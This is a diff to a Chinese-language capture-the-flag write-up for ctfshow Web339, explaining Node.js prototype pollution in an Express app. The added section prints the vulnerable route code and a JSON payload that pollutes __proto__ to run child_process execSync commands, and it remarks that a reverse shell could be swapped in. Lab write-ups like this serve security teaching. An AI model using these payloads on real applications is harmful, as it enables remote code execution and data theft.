@@ -50,7 +50,7 @@ function copy(object1, object2){
 
 `object1[ctfshow] = object2[ctfshow]`，成功赋值为`36dboy`
 
-burpsuite发送请求包即可获取flag
+Burpsuite发送请求包即可获取flag
 
 ```
 POST /login HTTP/1.1
@@ -70,3 +70,59 @@ Connection: close
 {"__proto__":{"ctfshow":"36dboy"}}
 ```
 
+
+
+# Web339
+
+这道题开始麻烦起来了，先来分析思路，首先列出本题利用所需要的关键代码
+
+首先是login.js
+
+```
+/* GET home page.  */
+router.post('/', require('body-parser').json(),function(req, res, next) {
+  res.type('html');
+  var flag='flag_here';
+  var secert = {};
+  var sess = req.session;
+  let user = {};
+  utils.copy(user,req.body);
+  if(secert.ctfshow===flag){
+    res.end(flag);
+  }else{
+    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
+  }
+});
+```
+
+之后是api.js
+
+```
+var express = require('express');
+var router = express.Router();
+var utils = require('../utils/common');
+
+
+// var query = "return global.process.mainModule.constructor._load('child_process').execSync('whoami');";
+/* GET home page.  */
+router.post('/', require('body-parser').json(),function(req, res, next) {
+  res.type('html');
+  res.render('api', { query: Function(query)(query)});
+   
+});
+module.exports = router;
+```
+
+我们发现在api.js当中`Function里的query变量没有被引用`，如果我们能够通过原型污染攻击给它赋任意我们想要的值会怎样？？岂不是可以随意执行代码进行RCE了
+
+首先给出我的payload吧，当然嫌麻烦的话里面可以搞成反弹shell的，看自己
+
+```
+{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').execSync('cat routes/login.js');"}}
+```
+
+通过调试我发现污染到了this,在nodejs当中其指向module.exports，最外层调用的时候会指向global，具体原因还不知道，未来希望能够破解，暂时水平受限，反正看到query到了全局变量里面
+
+![CTFSHOW-WEB339](./pic/CTFSHOW-WEB339.png)
+
+之后我们前往`url/api`界面发起post包即可获得flag
